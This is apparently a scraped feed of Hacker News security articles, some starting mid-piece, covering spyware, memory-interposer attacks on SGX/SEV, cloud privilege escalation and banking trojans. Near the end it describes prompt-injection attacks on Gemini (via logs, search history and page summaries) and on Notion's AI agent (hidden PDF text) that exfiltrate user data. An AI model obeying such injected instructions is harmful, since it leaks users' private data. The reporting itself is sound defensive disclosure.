ESET said its telemetry also flagged another Android spyware family actively distributed in the wild and targeting users in the same region around the same time ProSpy was detected. The ToSpy campaign, which likely began on June 30, 2022, and is currently ongoing, has leveraged fake sites impersonating the ToTok app to deliver the malware.

The regionally focused campaigns center around stealing sensitive data files, media, contacts, and chat backups, with the ToTok Pro app propagated in the ProSpy cluster featuring a ""CONTINUE"" button that, when tapped, redirects the user to the official download page in the web browser and instructs them to download the actual app.

""This redirection is designed to reinforce the illusion of legitimacy,"" ESET said. ""Any future launches of the malicious ToTok Pro app will instead open the real ToTok app, effectively masking the spyware's presence. However, the user will still see two apps installed on the device (ToTok and ToTok Pro), which could be suspicious.""
The Signal Encryption Plugin, in a similar manner, includes an ""ENABLE"" button to deceive the users into downloading the legitimate encrypted messaging app by visiting the signal[.]org site. But unlike the case of ToTok Pro, the rogue Signal app icon is changed to impersonate Google Play Services once the victim grants it all the necessary permissions.
Regardless of the app installed, the spyware embedded within it stealthily exfiltrates the data before the user clicks CONTINUE or ENABLE. This includes device information, SMS messages, contact lists, files, and a list of installed applications.

""Similarly to ProSpy, ToSpy also includes steps designed to further deceive the victim into believing that the malware they just installed is a legitimate app,"" Štefanko said. ""After the user launches the malicious ToTok app, there are two possible scenarios: either the official ToTok app is installed on the device or it's not.""
""If the official ToTok app is not installed on the device, ToSpy attempts to redirect the user to the Huawei AppGallery, either through an already installed Huawei app or via the default browser, suggesting the user download the official ToTok app.""

In the event the app is already installed on the device, it displays a fake screen to give the impression that it's checking for app updates before seamlessly launching the official ToTok app. However, in the background, it collects user contacts, files matching certain extensions, device information, and ToTok data backups (*.ttkmbackup).
To achieve persistence, both the spyware families run a foreground service that displays a persistent notification, use Android's AlarmManager to repeatedly restart the foreground service if it gets terminated, and automatically launch the necessary background services upon a device reboot.
ESET said the campaigns are being tracked differently due to differences in delivery methods and infrastructure, despite several commonalities in the malware deployed. It's currently not known who is behind the activity. Nor is there information on either how many or who specifically was targeted by these campaigns, it told The Hacker News.
""Users should remain vigilant when downloading apps from unofficial sources and avoid enabling installation from unknown origins, as well as when installing apps or add-ons outside of official app stores, especially those claiming to enhance trusted services,"" the company added.
Update
Google shared the below statement with The Hacker News following the publication of the story -
Android users are automatically protected against known versions of this malware by Google Play Protect, which is on by default on Android devices with Google Play Services. Google Play Protect can warn users or block apps known to exhibit malicious behavior, even when those apps come from sources outside of Play.

2025-10-06 11:11:18,"Oct 01, 2025",The Hacker News,https://thehackernews.com,https://thehackernews.com/2025/10/new-wiretap-attack-extracts-intel-sgx.html,New WireTap Attack Extracts Intel SGX ECDSA Key via DDR4 Memory-Bus Interposer,"In yet another piece of research, academics from Georgia Institute of Technology and Purdue University have demonstrated that the security guarantees offered by Intel's Software Guard eXtensions (SGX) can be bypassed on DDR4 systems to passively decrypt sensitive data.
SGX is designed as a hardware feature in Intel server processors that allows applications to be run in a Trusted Execution Environment (TEE). It essentially isolates trusted code and resources within what's called enclaves, preventing attackers from viewing their memory or CPU state. 
In doing so, the mechanism ensures that the data stays confidential even when the underlying operating system has been tampered with or compromised by other means. However, the latest findings show the limitations of SGX.
""We show how one can build a device to physically inspect all memory traffic inside a computer cheaply and easily, in environments with only basic electrical tools, and using equipment easily purchased on the internet,"" the researchers said. ""Using our interposer device against SGX's attestation mechanism, we are able to extract an SGX secret attestation key from a machine in fully trusted status, thereby breaching SGX's security.""
Like the Battering RAM attack recently disclosed by KU Leuven and the University of Birmingham researchers, the newly devised method – codenamed WireTap – relies on an interposer that sits between the CPU and the memory module to observe the data that flows between them. The interposer can be installed by a threat actor either through a supply chain attack or physical compromise.

At its core, the physical attack exploits Intel's use of deterministic encryption to stage a full key recovery against Intel SGX's Quoting Enclave (QE), effectively making it possible to extract an ECDSA signing key that can be used to sign arbitrary SGX enclave reports.
Put differently, an attacker can weaponize the deterministic nature of memory encryption to build an oracle of sorts to break the security of constant-time cryptographic code.

""We have successfully extracted attestation keys, which are the primary mechanism used to determine whether code is running under SGX,"" the researchers said. ""This allows any hacker to masquerade as genuine SGX hardware, while in fact running code in an exposed manner and peeking into your data.""
""Like two sides of the same coin, WireTap and Battering RAM look at complementary properties of deterministic encryption. While WireTap focuses mainly on breaching confidentiality, BatteringRAM focuses mostly on integrity. The bottom line is the same; however, both SGX and SEV are easy to break using memory interposition.""
However, while Battering RAM is a low-cost attack that can be pulled off using equipment costing less than $50, the WireTap setup costs about $1,000, including the logic analyzer.

In a hypothetical attack scenario targeting SGX-backed blockchain deployments such as Phala Network, Secret Network, Crust Network, and IntegriTEE, the study found that WireTap can be leveraged to undermine confidentiality and integrity guarantees and allow attackers to disclose confidential transactions or illegitimately obtain transaction rewards.
In response to the findings, Intel said the exploit is outside the scope of its threat model since it assumes a physical adversary that has direct access to the hardware with a memory bus interposer. In the absence of a ""patch,"" it's recommended that the servers be run in secure physical environments and use cloud providers that provide independent physical security.
""Such attacks are outside the scope of the boundary of protection offered by Advanced Encryption Standard-XEX-based Tweaked Codebook Mode with Ciphertext Stealing (AES-XTS) based memory encryption,"" the chipmaker said. ""As it provides limited confidentiality protection, and no integrity or anti-replay protection against attackers with physical capabilities, Intel does not plan to issue a CVE."""

The identity security said the problem stems from the fact that the application listing endpoint – /api/2/apps – was configured to return more data than expected, including the client_secret values in the API response alongside metadata related to the apps in a OneLogin account.
The steps to pull off the attack are listed below -

Attacker uses valid OneLogin API credentials (client ID and secret) to authenticate
Request access token
Call the /api/2/apps endpoint to list all applications
Parse the response to retrieve client secrets for all OIDC applications
Use extracted client secrets to impersonate applications and access integrated services

Successful exploitation of the flaw could allow an attacker with valid OneLogin API credentials to retrieve client secrets for all OIDC applications configured within a OneLogin tenant. Armed with this access, the threat actor could leverage the exposed secret to impersonate users and gain access to other applications, offering opportunities for lateral movement.
OneLogin's role-based access control (RBAC) grants API keys broad endpoint access, meaning the compromised credentials could be used to access sensitive endpoints across the entire platform. Compounding matters further is the lack of IP address allowlisting, as a result of which it's possible for attackers to exploit the flaw from anywhere in the world, Clutch noted.

Following responsible disclosure on July 18, 2025, the vulnerability was addressed in OneLogin 2025.3.0, which was released last month by making OIDC client_secret values no longer visible. There is no evidence that the issue was ever exploited in the wild.
""Protecting our customers is our top priority, and we appreciate the responsible disclosure by Clutch Security,"" Stuart Sharp, VP of Product at One Identity for OneLogin, told The Hacker News. ""The reported vulnerability was resolved within a reasonable timeframe with the OneLogin 2025.3.0 release. To our knowledge, no customers were impacted by this vulnerability.""
""Identity providers serve as the backbone of enterprise security architecture,"" Clutch Security said. ""Vulnerabilities in these systems can have cascading effects across entire technology stacks, making rigorous API security essential."""

That's why we're hosting a new webinar, ""Workflow Clarity: Where AI Fits in Modern Automation,"" with Thomas Kinsella, Co-founder & Chief Customer Officer at Tines, to explore how leading teams are cutting through the hype and building workflows that actually deliver.The rise of AI has changed how organizations think about automation. But here's the reality many teams are quietly wrestling with: AI isn't a silver bullet. Purely human-led workflows buckle under pressure, rigid rules-based automations break the moment reality shifts, and fully autonomous AI agents risk introducing black-box decision-making that's impossible to audit.
For cybersecurity and operations leaders, the stakes are even higher. You need workflows that are fast but reliable, powerful but secure, and—above all—explainable.
So where does AI really fit in?
The Hidden Problem with ""All-In"" Automation
The push to automate everything has left many teams with fragile systems:

Too much human intervention: slows down response time and eats up valuable analyst hours.
Too many rigid rules: can't adapt to new threats or business realities, leading to constant rework.
Too much AI: risks shadow processes that no one fully understands, undermining trust and compliance.

The truth? The strongest workflows aren't found at the extremes—they emerge when human judgment, traditional automation, and AI are blended intentionally.
A Webinar for Teams Who Want More Than AI Hype
Join Thomas Kinsella for a candid look at how top security and operations teams are blending people, rules, and AI agents to build workflows that deliver real outcomes—without over-engineering or sacrificing control.
In this session, you'll learn:

Where AI belongs (and where it doesn't): practical guidance on mapping human, rules-based, and AI-driven tasks.
How to avoid AI overreach: spotting when automation is adding complexity instead of clarity.
Building for security and auditability: ensuring workflows stand up to compliance and scrutiny.
Proven patterns from the field: real-world examples of how top security teams are scaling AI automation thoughtfully.

This session is designed for security leaders who are tired of the AI hype and want to cut through the noise. If you're looking for practical strategies to deploy automation that strengthens defenses—without creating new risks—this is for you.
Watch this Webinar Now 

It's equally valuable for Ops and IT teams working to free up their human talent while avoiding brittle, opaque systems that collapse under real-world pressure. And if you're an innovation-minded professional exploring how to balance people, rules, and AI agents in the workplace, you'll walk away with a clear framework for making those choices.
AI is already transforming workflows, but the winners won't be those who chase complexity—they'll be the teams who embrace clarity, security, and control. This webinar will give you the tools to identify the right mix of human, rules-based, and AI automation for your environment, and show you how to implement it in ways that are secure, auditable, and built to scale with confidence.
Don't just ""add AI."" Learn how to make it work for you—at scale, with control. Register now to save your spot."

OpenShift AI is a platform for managing the lifecycle of predictive and generative artificial intelligence (GenAI) models at scale and across hybrid cloud environments. It also facilitates data acquisition and preparation, model training and fine-tuning, model serving and model monitoring, and hardware acceleration.
The vulnerability, tracked as CVE-2025-10725, carries a CVSS score of 9.9 out of a maximum of 10.0. It has been classified by Red Hat as ""Important"" and not ""Critical"" in severity owing to the need for a remote attacker to be authenticated in order to compromise the environment.
""A low-privileged attacker with access to an authenticated account, for example, as a data scientist using a standard Jupyter notebook, can escalate their privileges to a full cluster administrator,"" Red Hat said in an advisory earlier this week.

""This allows for the complete compromise of the cluster's confidentiality, integrity, and availability. The attacker can steal sensitive data, disrupt all services, and take control of the underlying infrastructure, leading to a total breach of the platform and all applications hosted on it.""
According to a Bugzilla report, the vulnerability is the result of an overly permissive ClusterRole that allows authenticated users to escalate privileges to that of a cluster administrator.
""This grants any authenticated entity, including low-privileged service accounts for user workbenches, the permission to create OpenShift Jobs in any namespace,"" per the report. ""An attacker can abuse this permission to schedule a malicious Job in a privileged namespace (e.g., openshift-apiserver-operator), configuring it to run with a high-privilege ServiceAccount.""
As a result, an attacker could abuse this behavior to schedule a job that can exfiltrate the ServiceAccount token, enabling them to progressively pivot and compromise more powerful accounts, ultimately achieving root access on cluster master nodes and leading to a full cluster takeover.
The following versions are affected by the flaw -

Red Hat OpenShift AI 2.19
Red Hat OpenShift AI 2.21
Red Hat OpenShift AI (RHOAI)

While previously the IBM subsidiary recommended users to avoid granting broad permissions to system-level groups and revoke the ClusterRoleBinding that associates the kueue-batch-user-role with the system:authenticated group, it has since revised the alert to note that the mitigations ""do not meet"" its ""Product Security criteria comprising ease of use and deployment.""

French cybersecurity company SEKOIA said the attackers are exploiting the cellular router's API to send malicious SMS messages containing phishing URLs, with the campaigns primarily targeting Sweden, Italy, and Belgium using typosquatted URLs that impersonate government platforms like CSAM and eBox, as well as banking, postal, and telecom providers.
Of the 18,000 routers of this type accessible on the public internet, no less than 572 are assessed to be potentially vulnerable due to them exposing the inbox/outbox APIs. About half of the identified vulnerable routers are located in Europe.

""Moreover, the API enables retrieval of both incoming and outgoing SMS messages, which indicates that the vulnerability has been actively exploited to disseminate malicious SMS campaigns since at least February 2022,"" the company said. ""There is no evidence of any attempt to install backdoors or exploit other vulnerabilities on the device. This suggests a targeted approach, aligned specifically with the attacker's smishing operations.""
It's believed the attackers are exploiting a now-patched information disclosure flaw impacting Milesight routers (CVE-2023-43261, CVSS score: 7.5), which was disclosed by security researcher Bipin Jitiya exactly two years ago. Weeks later, VulnCheck revealed that the vulnerability may have been weaponized in the wild shortly following public disclosure.

Further investigation has revealed that some of the industrial routers expose SMS-related features, including sending messages or viewing SMS history, without requiring any form of authentication.
The attacks likely involve an initial validation phase where the threat actors attempt to verify whether a given router can send SMS messages by targeting a phone number under their control. SEKOIA further noted that the API could also be publicly accessible due to misconfigurations, given that a couple of routers have been found running more recent firmware versions that are not susceptible to CVE-2023-43261.
The phishing URLs distributed using this method include JavaScript that checks whether the page is being accessed from a mobile device before serving the malicious content, which, in turn, urges users to update their banking information for purported reimbursement.

What's more, one of the domains used in the campaigns between January and April 2025 – jnsi[.]xyz – feature JavaScript code to disable right-click actions and browser debugging tools in an attempt to hinder analysis efforts. Some of the pages have also been found to log visitor connections to a Telegram bot named GroozaBot, which is operated by an actor named ""Gro_oza,"" who appears to speak both Arabic and French.
""The smishing campaigns appear to have been conducted through the exploitation of vulnerable cellular routers – a relatively unsophisticated, yet effective, delivery vector,"" SEKOIA said. ""These devices are particularly appealing to threat actors as they enable decentralised SMS distribution across multiple countries, complicating both detection and takedown efforts."""

The annual research combines insights from over 1,200 IT and security professionals across six countries, along with an analysis of 700,000 cyber incidents by Bitdefender Labs. The results reveal hard truths about how organizations are grappling with threats in an increasingly complex environment.
Breaches Swept Under the Rug
This year's findings spotlight a disturbing trend: 58% of security professionals were told to keep a breach confidential, even when they believed disclosure was necessary. That's a 38% jump since 2023, suggesting more organizations may be prioritizing optics over transparency.
The pressure is especially acute for CISOs and CIOs, who report higher levels of expectation to remain quiet compared to frontline staff. Such secrecy risks undermining stakeholder trust, compliance obligations, and long-term resilience.
Living-Off-the-Land Attacks Drive Attack Surface Focus
Bitdefender analyzed 700,000 high-severity attacks and found that 84% of high-severity attacks now  now leverage legitimate tools already present inside environments — so-called Living Off the Land (LOTL) techniques. These tactics bypass traditional defenses, operate invisibly, and are increasingly used in targeted intrusions.
In response, 68% of surveyed organizations list attack surface reduction as a top priority, with the U.S. (75%) and Singapore (71%) leading adoption. Proactive hardening steps — disabling unnecessary services, eliminating unused applications, and reducing lateral movement paths — are quickly shifting from best practices to business imperatives.
AI: Perception vs. Reality
AI looms large in the minds of defenders, but perceptions don't always align with on-the-ground reality.

67% believe AI-driven attacks are increasing
58% cite AI-powered malware as their top concern

Yet, the report shows that while AI-enhanced attacks are growing, fears may be outpacing actual prevalence. This gap underscores the need for a balanced approach: prepare for AI threats without losing sight of today's highlights the need for a balanced approach: prepare for AI threats without losing sight of prevalent adversary tactics. 
Leadership Disconnect Risks Slowdowns
Perhaps most concerning is the misalignment between executives and operational teams:

45% of C-level executives report being ""very confident"" in managing cyber risk
Only 19% of mid-level managers agree

Strategic focus areas also diverge: executives prioritize AI adoption, while frontline managers place more urgency on cloud security and identity management. These disconnects can slow progress, dilute resources, and create blind spots that attackers exploit.
The Road Ahead
The findings converge on one message: cyber resilience demands preemptive strategies. That means:

Actively reducing attack surfaces
Streamlining security tools and complexity
Addressing team burnout and the skills gap
Closing the perception differences between leadership and the front-line

Italian fraud prevention firm Cleafy, which discovered the sophisticated malware and remote access trojan (RAT) in late August 2025, said it leverages Hidden Virtual Network Computing (VNC) for remote control of infected devices and dynamic overlays for facilitating credential theft, ultimately enabling fraudulent transactions.
""Klopatra represents a significant evolution in mobile malware sophistication,"" security researchers Federico Valentini, Alessandro Strino, Simone Mattia, and Michele Roviello said. ""It combines extensive use of native libraries with the integration of Virbox, a commercial-grade code protection suite, making it exceptionally difficult to detect and analyze.""
Evidence gathered from the malware's command-and-control (C2) infrastructure and linguistic clues in the associated artifacts suggests that it is being operated by a Turkish-speaking criminal group as a private botnet, given the absence of a public malware-as-a-service (MaaS) offering. As many as 40 distinct builds have been discovered since March 2025.
Attack chains distributing Klopatra employ social engineering lures to trick victims into downloading dropper apps that masquerade as seemingly harmless tools, such as IPTV applications, allowing the threat actors to bypass security defences and completely take control of their mobile devices.

Offering the ability to access high-quality TV channels as a lure is a deliberate choice, as pirated streaming applications are popular among users, who are often willing to install such apps from untrusted sources, thus unwittingly infecting their phones in the process.
The dropper app, once installed, requests the user to grant it permissions to install packages from unknown sources. Upon obtaining this permission, the dropper extracts and installs the main Klopatra payload from a JSON Packer embedded within it. The banking trojan is no different from other malware of its kind, seeking permission to Android's accessibility services to realize its goals.

While accessibility services is a legitimate framework designed to assist users with disabilities to interact with the Android device, it can be a potent weapon in the hands of bad actors, who can abuse it to read contents of the screen, record keystrokes, and perform actions on behalf of the user to conduct fraudulent transactions in an autonomous manner.

""What elevates Klopatra above the typical mobile threat is its advanced architecture, built for stealth and resilience,"" Cleafy said. ""The malware authors have integrated Virbox, a commercial-grade code protection tool rarely seen in the Android threat landscape. This, combined with a strategic shift of core functionalities from Java to native libraries, creates a formidable defensive layer.""
""This design choice drastically reduces its visibility to traditional analysis frameworks and security solutions, applying extensive code obfuscation, anti-debugging mechanisms, and runtime integrity checks to hinder analysis.""
Besides incorporating features to maximize evasion, resilience, and operational effectiveness, the malware provides operators with granular, real-time control over the infected device using VNC features that are capable of serving a black screen to conceal the malicious activity, such as executing banking transactions without their knowledge.

Klopatra also uses the accessibility services to grant itself additional permissions as required to prevent the malware from being terminated, and attempts to uninstall any hard-coded antivirus apps already installed on the device. Furthermore, it can launch fake overlay login screens atop financial and cryptocurrency apps to siphon credentials. These overlays are delivered dynamically from the C2 server when the victim opens one of the targeted apps.
It's said the human operator actively engages in fraud attempts over what's described as a ""carefully orchestrated sequence"" that involves first checking if the device is charging, the screen is off, and is currently not being actively used.
If these conditions are met, a command is issued to reduce the screen brightness to zero and display a black overlay, giving the impression to the victim that the device is inactive and off. In the background, however, the threat actors use the device PIN or pattern previously stolen to gain unauthorized access, launch the targeted banking app, and drain the funds through multiple instant bank transfers.

The findings show that although Klopatra doesn't try to reinvent the wheel, it poses a serious threat to the financial sector owing to a technically advanced assemblage of features to obfuscate its true nature.
""Klopatra marks a significant step in the professionalization of mobile malware, demonstrating a clear trend of threat actors adopting commercial-grade protections to maximize the lifespan and profitability of their operations,"" the company said.
""The operators show a clear preference for conducting their attacks during the night. This timing is strategic: the victim is likely asleep, and their device is often left charging, ensuring it remains powered on and connected. This provides the perfect window for the attacker to operate undetected.""
The development comes a day after ThreatFabric flagged a previously undocumented Android banking trojan called Datzbro that can conduct device takeover (DTO) attacks and perform fraudulent transactions by preying on the elderly.
Update
Following the publication of the story, a Google spokesperson told The Hacker News that it has not found any apps containing the malware on Google Play, and that Android users are safeguarded by Google Play Protect.
""Based on our current detection, no apps containing this malware are found on Google Play,"" the company said. ""Android users are automatically protected against known versions of this malware by Google Play Protect, which is on by default on Android devices with Google Play Services. Google Play Protect can warn users or block apps known to exhibit malicious behavior, even when those apps come from sources outside of Play.""

The activity, observed in September 2025, has been attributed to a threat cluster it tracks as UAC-0245. The agency said it spotted the attack following the discovery of software tools taking the form of XLL files, which refer to Microsoft Excel add-ins that are typically used to extend the functionality of Excel with custom functions.
Further investigation has uncovered that the XLL files are distributed within ZIP archives shared on the Signal messaging app, disguised as a document concerning the detention of individuals who had attempted to cross the Ukrainian border.

The XLL, once launched, is designed to create a number of executables on the compromised host, namely an EXE file in the Startup folder, an XLL file named ""BasicExcelMath.xll"" in the ""%APPDATA%\Microsoft\Excel\XLSTART\"" directory, and a PNG image named ""Office.png.""
Windows Registry modifications are done to ensure persistence of the executable, after which it launches the Excel application (""excel.exe"") with the ""/e"" (""/embed"") parameter in hidden mode in order to ultimately run the XLL add-in. The main purpose of the XLL is to parse and extract from the PNG file shellcode that's classified as CABINETRAT.
Both the XLL payload and the shellcode come with a number of anti-VM and anti-analysis procedures to evade detection, including checking for at least two processor cores and at least 3GB of RAM, and the presence of tools like VMware, VirtualBox, Xen, QEMU, Parallels, and Hyper-V.
A full-fledged backdoor written in the C programming language, CABINETRAT is mainly designed to gather system information, a list of installed programs, screenshots, as well as enumerate directory contents, deleting specific files or directories, running commands, and carrying out file uploads/downloads. It communicates with a remote server over a TCP connection.
The disclosure comes days after Fortinet FortiGuard Labs warned of attacks targeting Ukraine by impersonating the National Police of Ukraine in a fileless phishing campaign that delivers Amatera Stealer and PureMiner for harvesting sensitive data and mining cryptocurrency from targeted systems."
2025-10-06 11:11:36,"Sep 30, 2025",The Hacker News,https://thehackernews.com,https://thehackernews.com/2025/10/50-battering-ram-attack-breaks-intel.html,New $50 Battering RAM Attack Breaks Intel and AMD Cloud Security Protections,"A group of academics from KU Leuven and the University of Birmingham has demonstrated a new vulnerability called Battering RAM to bypass the latest defenses on Intel and AMD cloud processors.
""We built a simple, $50 interposer that sits quietly in the memory path, behaving transparently during startup and passing all trust checks,"" researchers Jesse De Meulemeester, David Oswald, Ingrid Verbauwhede, and Jo Van Bulck said on a website publicizing the findings. ""Later, with just a flip of a switch, our interposer turns malicious and silently redirects protected addresses to attacker-controlled locations, allowing corruption or replay of encrypted memory.""
Battering RAM compromises Intel's Software Guard Extensions (SGX) and AMD's Secure Encrypted Virtualization with Secure Nested Paging (SEV-SNP) hardware security features, which ensure that customer data remains encrypted in memory and protected during use.
It affects all systems using DDR4 memory, specifically those relying on confidential computing workloads running in public cloud environments to secure data from the cloud service provider using hardware-level access control and memory encryption.
The attack, in a nutshell, involves leveraging a custom-built, low-cost DDR4 interposer hardware hack to stealthily redirect physical addresses and gain unauthorized access to protected memory regions. The interposer makes use of simple analog switches to actively manipulate signals between the processor and memory, and can be built for less than $50.
On Intel platforms, Battering RAM achieves arbitrary read access to victim plaintext or write plaintext into victim enclaves, whereas on AMD systems, the attack can be used to sidestep recent firmware mitigations against BadRAM, which was documented by the researchers back in December 2024, and introduce arbitrary backdoors into the virtual machine without raising any suspicion.

Successful exploitation of the vulnerability can allow a rogue cloud infrastructure provider or insider with limited physical access to compromise remote attestation and enable the insertion of arbitrary backdoors into protected workloads.

Battering RAM was reported to the vendors earlier this year, following which Intel, AMD, and Arm have responded that physical attacks are currently considered out of scope of their product's threat model. However, defending against Battering RAM would require a fundamental redesign of memory encryption itself, the researchers noted.
""Battering RAM exposes the fundamental limits of the scalable memory encryption designs currently used by Intel and AMD, which omit cryptographic freshness checks in favor of larger protected memory sizes,"" they added. ""Battering RAM [...] is capable of introducing memory aliases dynamically at runtime. As a result, Battering RAM can circumvent Intel's and AMD's boot-time alias checks.""
The disclosure comes as AMD released mitigations for attacks dubbed Heracles and Relocate-Vote disclosed by the University of Toronto and ETH Zürich, respectively, that can leak sensitive data from cloud environments and confidential virtual machines that rely on AMD's SEV-SNP technology by means of a malicious hypervisor.
""The system lets the hypervisor move data around to manage memory efficiently,"" David Lie, director of the Schwartz Reisman Institute (SRI) at the University of Toronto, said. ""So when data is relocated, AMD's hardware decrypts it from the old location and re-encrypts it for the new location. But, what we found was that by doing this over and over again, a malicious hypervisor can learn recurring patterns from within the data, which could lead to privacy breaches.""
Last month, ETH Zürich researchers also demonstrated that a CPU optimization known as the stack engine can be abused as a side channel for attacks that lead to information leakage. A proof-of-concept (PoC) has been developed for AMD Zen 5 machines, although it's believed that all models have this ""abusable hardware feature.""
The discovery of Battering RAM also follows a report from Vrije Universiteit Amsterdam researchers about a new, realistic attack technique referred to as L1TF Reloaded that combines L1 Terminal Fault (aka Foreshadow) and Half-Spectre gadgets (aka incomplete Spectre-like code patterns) to leak memory from virtual machines running on public cloud services.
""L1TF is a CPU vulnerability that allows an (attacker) VM to speculatively read any data residing in the (core-local) L1 data cache – including data the VM shouldn't have access to,"" VUSec researchers said. ""At a high level, L1TF Reloaded abuses this to obtain an arbitrary RAM read primitive.""

Google, which provided the researchers with a sole-tenant node in order to conduct the research safely without potentially affecting any other customers, awarded a $151,515 bug bounty and ""applied fixes to the affected assets."" Amazon said the L1TF Reloaded vulnerability does not impact the guest data of AWS customers running on the AWS Nitro System or Nitro Hypervisor.
Spectre, which first came to light in early 2018, continues to haunt modern CPUs, albeit in the form of different variants. As recently as two weeks ago, academics from ETH Zürich devised a new attack known as VMScape (CVE-2025-40300, CVSS score: 6.5) that breaks virtualization boundaries in AMD Zen CPUs and Intel Coffee Lake processors.
Described as a Spectre branch target injection (Spectre-BTI) attack targeting the cloud, it exploits isolation gaps across host and guest in user and supervisor modes to leak arbitrary memory from an unmodified QEMU process. A software fix has been introduced in the Linux kernel to counter the cross-virtualization BTI (vBTI) attack primitive.
""VMScape can leak the memory of the QEMU process at the rate of 32 B/s on AMD Zen 4,"" the authors said in a study. ""We use VMScape to find the location of secret data and leak the secret data, all within 772 s, extracting the cryptographic key used for disk encryption/decryption as an example."""
2025-10-06 11:11:40,"Sep 30, 2025",The Hacker News,https://thehackernews.com,https://thehackernews.com/2025/09/phantom-taurus-new-china-linked-hacker.html,Phantom Taurus: New China-Linked Hacker Group Hits Governments With Stealth Malware,"Government and telecommunications organizations across Africa, the Middle East, and Asia have emerged as the target of a previously undocumented China-aligned nation-state actor dubbed Phantom Taurus over the past two-and-a-half years.
""Phantom Taurus' main focus areas include ministries of foreign affairs, embassies, geopolitical events, and military operations,"" Palo Alto Networks Unit 42 researcher Lior Rochberger said. ""The group's primary objective is espionage. Its attacks demonstrate stealth, persistence, and an ability to quickly adapt their tactics, techniques, and procedures (TTPs).""
It's worth pointing out that the hacking group was first detailed by the cybersecurity company back in June 2023 under the moniker CL-STA-0043. Then last May, the threat cluster was graduated to a temporary group, TGR-STA-0043, following revelations about its sustained cyber espionage efforts aimed at governmental entities since at least late 2022 as part of a campaign codenamed Operation Diplomatic Specter.
Unit 42 said its continued observation of the group yielded enough evidence to classify it as a new threat actor whose primary goal is to enable long-term intelligence collection and obtain confidential data from targets that are of strategic interest to China, both economically and geopolitically. 

""The group takes an interest in diplomatic communications, defense-related intelligence and the operations of critical governmental ministries,"" the company said. ""The timing and scope of the group's operations frequently coincide with major global events and regional security affairs.""
This aspect is particularly revealing, not least because other Chinese hacking groups have also embraced a similar approach. For instance, a new adversary tracked by Recorded Future as RedNovember is assessed to have targeted entities in Taiwan and Panama in close proximity to ""geopolitical and military events of key strategic interest to China.""
Phantom Taurus' modus operandi also stands out due to the use of custom-developed tools and techniques rarely observed in the threat landscape. This includes a never-before-seen bespoke malware suite dubbed NET-STAR. Developed in .NET, the program is designed to target Internet Information Services (IIS) web servers.

That said, the hacking crew has relied on shared operational infrastructure that has been previously employed by groups like AT27 (aka Iron Taurus), APT41 (aka Starchy Taurus or Winnti), and Mustang Panda (aka Stately Taurus). Conversely, the infrastructure components used by the threat actor have not been detected in operations carried out by others, indicating some sort of ""operational compartmentalization"" within the shared ecosystem.
The exact initial access vector is not clear, but prior intrusions have weaponized vulnerable on-premises Internet Information Services (IIS) and Microsoft Exchange servers, abusing flaws like ProxyLogon and ProxyShell, to infiltrate target networks.
""So far we have seen them exploiting known vulnerabilities for IIS and Microsoft Exchange servers (such as ProxyLogon and ProxyShell), but that doesn't mean it won't change in the future,"" Assaf Dahan, director of threat research at Unit 42, told The Hacker News. ""The group is very resourceful and motivated – they will find a way in one way or another.""
Another significant facet of the attacks is the shift from gathering emails to the direct targeting of databases using a batch script that makes it possible to connect to an SQL Server database, export the results in the form of a CSV file, and terminate the connection. The script is executed using the Windows Management Instrumentation (WMI) infrastructure.
Unit 42 said the threat actor used this method to methodically search for documents of interest and information related to specific countries such as Afghanistan and Pakistan.

Recent attacks mounted by Phantom Taurus have also leveraged NET-STAR, which consists of three web-based backdoors, each of which performs a specific function while maintaining access to the compromised IIS environment -

IIServerCore, a fileless modular backdoor loaded by means of an ASPX web shell that supports in-memory execution of command-line arguments, arbitrary commands, and payloads, and transmits the results in an encrypted command-and-control (C2) communication channel
AssemblyExecuter V1, which loads and executes additional .NET payloads in memory
AssemblyExecuter V2, an enhanced version of AssemblyExecuter V1 that also comes fitted with the ability to bypass Antimalware Scan Interface (AMSI) and Event Tracing for Windows (ETW)

""The NET-STAR malware suite demonstrates Phantom Taurus' advanced evasion techniques and a deep understanding of .NET architecture, representing a significant threat to internet-facing servers,"" Unit 42 said. ""IIServerCore also supports a command called changeLastModified. This suggests that the malware has active timestomping capabilities, designed to confuse security analysts and digital forensics tools."""

The vulnerabilities have been collectively codenamed the Gemini Trifecta by the cybersecurity company. They reside in three distinct components of the Gemini suite -

A prompt injection flaw in Gemini Cloud Assist that could allow attackers to exploit cloud-based services and compromise cloud resources by taking advantage of the fact that the tool is capable of summarizing logs pulled directly from raw logs, enabling the threat actor to conceal a prompt within a User-Agent header as part of an HTTP request to a Cloud Function and other services like Cloud Run, App Engine, Compute Engine, Cloud Endpoints, Cloud Asset API, Cloud Monitoring API, and Recommender API
A search-injection flaw in the Gemini Search Personalization model that could allow attackers to inject prompts and control the AI chatbot's behavior to leak a user's saved information and location data by manipulating their Chrome search history using JavaScript and leveraging the model's inability to differentiate between legitimate user queries and injected prompts from external sources
An indirect prompt injection flaw in Gemini Browsing Tool that could allow attackers to exfiltrate a user's saved information and location data to an external server by taking advantage of the internal call Gemini makes to summarize the content of a web page


Tenable said the vulnerabilities could have been abused to embed the user's private data inside a request to a malicious server controlled by the attacker without the need for Gemini to render links or images.
""One impactful attack scenario would be an attacker who injects a prompt that instructs Gemini to query all public assets, or to query for IAM misconfigurations, and then creates a hyperlink that contains this sensitive data,"" Matan said of the Cloud Assist flaw. ""This should be possible since Gemini has the permission to query assets through the Cloud Asset API.""

In the case of the second attack, the threat actor would first need to persuade a user to visit a website that they had set up to inject malicious search queries containing prompt injections into the victim's browsing history and poison it. Thus, when the victim later interacts with Gemini's search personalization model, the attacker's instructions are processed to steal sensitive data.
Following responsible disclosure, Google has since stopped rendering hyperlinks in the responses for all log summarization responses, and has added more hardening measures to safeguard against prompt injections.
""The Gemini Trifecta shows that AI itself can be turned into the attack vehicle, not just the target. As organizations adopt AI, they cannot overlook security,"" Matan said. ""Protecting AI tools requires visibility into where they exist across the environment and strict enforcement of policies to maintain control.""

The development comes as agentic security platform CodeIntegrity detailed a new attack that abuses Notion's AI agent for data exfiltration by hiding prompt instructions in a PDF file using white text on a white background that instructs the model to collect confidential data and then send it to the attackers.
""An agent with broad workspace access can chain tasks across documents, databases, and external connectors in ways RBAC never anticipated,"" the company said. ""This creates a vastly expanded threat surface where sensitive data or actions can be exfiltrated or misused through multi step, automated workflows."""
2025-10-06 11:11:44,"Sep 30, 2025",The Hacker News,https://thehackernews.com,https://thehackernews.com/2025/09/microsoft-expands-sentinel-into-agentic.html,Microsoft Expands Sentinel Into Agentic Security Platform With Unified Data Lake,"Microsoft on Tuesday unveiled the expansion of its Sentinel Security Incidents and Event Management solution (SIEM) as a unified agentic platform with the general availability of the Sentinel data lake.
